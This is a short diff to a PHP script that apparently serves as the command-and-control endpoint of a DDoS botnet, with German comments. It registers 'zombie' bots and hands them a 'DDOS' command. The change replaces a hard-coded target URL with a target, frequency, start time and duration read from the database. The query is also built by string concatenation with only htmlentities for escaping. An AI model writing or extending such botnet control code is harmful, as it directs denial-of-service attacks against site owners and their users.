@@ -9,13 +9,13 @@ if(!empty($zombieID)) {
 	
 	
 	// Bot bereits registriert?
-	$query = 'SELECT * FROM zombies WHERE id="'.htmlentities($zombieID).'";';
+	$query = 'SELECT *, UNIX_TIMESTAMP(timestamp) AS ts FROM zombies WHERE id="'.htmlentities($zombieID).'";';
 	$result = mysqli_query($link,$query);
 	if($result && mysqli_num_rows($result)>0) {
 		$row = mysqli_fetch_assoc($result);
 		echo $row["command"];
 		if($row["command"] == "DDOS") {
-			echo " http://www.yolocaust.de/tentob/ 3 1";
+			echo ' '.$row["target_url"].' '.$row["frequency"].' '.$row["ts"].' '.$row["duration"];
 		}
 		mysqli_free_result($result);
 		// Bot bekannt
